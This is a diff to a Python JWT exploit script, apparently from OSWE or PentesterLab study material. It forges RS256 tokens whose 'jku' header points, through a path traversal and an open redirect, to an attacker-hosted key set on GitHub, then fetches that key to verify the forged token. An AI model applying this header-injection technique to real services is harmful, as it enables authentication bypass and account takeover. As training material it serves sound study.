@@ -16,7 +16,7 @@ import cryptography.hazmat.primitives.asymmetric.padding as padding
 import cryptography.hazmat.primitives.serialization as serialization
 
 print("----- PARAMS -----")
-jku_url = "https://example.com/.well-known/attaker.json"
+jku_url = "http://example.com/.well-known/../redirect?redirect_uri=https://raw.githubusercontent.com/hobietje/oswe/master/automation/jwt/data/jku-2.json"
 print(jku_url)
 private_pem = open("data/rsa.private", "rb").read()
 print(private_pem)
@@ -28,7 +28,7 @@ print(private_key)
 
 print("----- ENCODE -----")
 # create an appropriate JSON object for header
-header_str = '{"typ":"JWT","alg":"RS256","jku":"' + jku_url + '"}'
+header_str = '{"typ":"JWT","alg":"RS256","kid":"pentesterlab","jku":"' + jku_url + '"}'
 header_data = json.loads(header_str)
 print(header_data)
 header_b = header_str.encode()
@@ -59,4 +59,9 @@ header = jwt.get_unverified_header(encoded)
 print(header)
 
 payload = jwt.decode(encoded, options={"verify_signature": False})
+print(payload)
+
+jwks_client = jwt.PyJWKClient(jku_url)
+signing_key = jwks_client.get_signing_key_from_jwt(encoded)
+payload = jwt.decode(encoded, signing_key.key, algorithms=["RS256"])
 print(payload)
